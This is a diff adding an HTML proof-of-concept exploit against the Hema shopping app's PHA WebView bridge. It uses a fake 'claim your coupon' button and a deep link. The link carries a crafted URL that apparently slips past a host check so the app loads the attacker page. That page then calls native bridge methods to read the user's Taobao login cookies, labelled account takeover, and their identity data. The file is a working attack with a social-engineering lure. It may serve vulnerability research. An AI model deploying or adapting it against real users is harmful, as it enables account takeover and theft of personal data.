@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>盒马 (com.wudaokou.hippo) PHA 桥 PoC</title>
+<style>
+  body{font-family:-apple-system,Roboto,sans-serif;margin:0;padding:14px;background:#0b0b0c;color:#e6e6e6;font-size:14px}
+  h1{font-size:16px;margin:6px 0 10px}
+  .sub{color:#999;font-size:12px;margin-bottom:12px;line-height:1.5}
+  button.launch{background:#ff4d4f;color:#fff;border:0;border-radius:8px;padding:12px 18px;font-size:15px;font-weight:700;width:100%;margin:6px 0}
+  button.launch:active{opacity:.7}
+  .card{background:#151517;border-radius:10px;padding:11px;margin-bottom:10px}
+  .card b{color:#ffd000}
+  pre{background:#000;color:#3fdb6b;padding:9px;border-radius:7px;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto;margin:6px 0 0}
+  .crown{color:#ff7a7a}
+</style>
+</head>
+<body>
+<h1>盒马 PHA 桥 PoC <span style="color:#888;font-size:12px">auto-fire</span></h1>
+<div class="sub">
+
+<button class="launch" onclick="launch()">点我领取盒马优惠券</button>
+
+
+<div class="card"><b class="crown">WVCookie.readCookies</b> <span class="sub">{"url":"www.taobao.com"} — 读登录 Cookie（ATO）</span><pre id="out_cookie">—</pre></div>
+<div class="card"><b class="crown">user.getUserInfo</b> <span class="sub">pha 原生 — 用户身份 PII</span><pre id="out_user">—</pre></div>
+
+<script>
+
+var TARGET_URL = "https://www.taobao.com|@opstos.github.io/hm.html";
+function launch(){
+  location.href = "wdkhema://main?url=" + encodeURIComponent(TARGET_URL);
+}
+
+
+var PHA = "__pha_bridge_engine__";
+var COOKIE_URL = 'https://www.taobao.com';
+function show(id,o){var e=document.getElementById(id);e.textContent='['+new Date().toLocaleTimeString()+']\n'+((typeof o==='string')?o:JSON.stringify(o,null,2));}
+
+window.__pha_native_to_js__ = function(id, err, data){
+  var e=document.getElementById(id); if(e) e.textContent='[回 '+new Date().toLocaleTimeString()+']\nerr='+err+'\ndata='+data;
+};
+
+function ph(module, method, params, outId){
+  var eng=window[PHA]; if(!eng||typeof eng.call!=='function'){ show(outId, PHA+' 不存在——桥未注入?'); return; }
+  try{ eng.call(outId, module, method, JSON.stringify(params||{})); }
+  catch(e){ show(outId,'EXC '+e); }
+}
+
+function wv(obj, method, params, outId){
+  ph('WindVane','call', {func: obj+'.'+method, param:{callbackId: outId, data: params||{}}}, outId);
+}
+function fire(){
+
+  wv('WVCookie','readCookies', {url: COOKIE_URL}, 'out_cookie');
+
+  ph('user','getUserInfo', {}, 'out_user');
+ 
+}
+
+(function(){
+  var tries=0;
+  (function wait(){
+    tries++;
+    var eng=window[PHA];
+    if(eng && typeof eng.call==='function'){ show('out_cookie','桥就绪，自动 fire…'); fire(); return; }
+
+    setTimeout(wait,160);
+  })();
+})();
+</script>
+</body>
+</html>
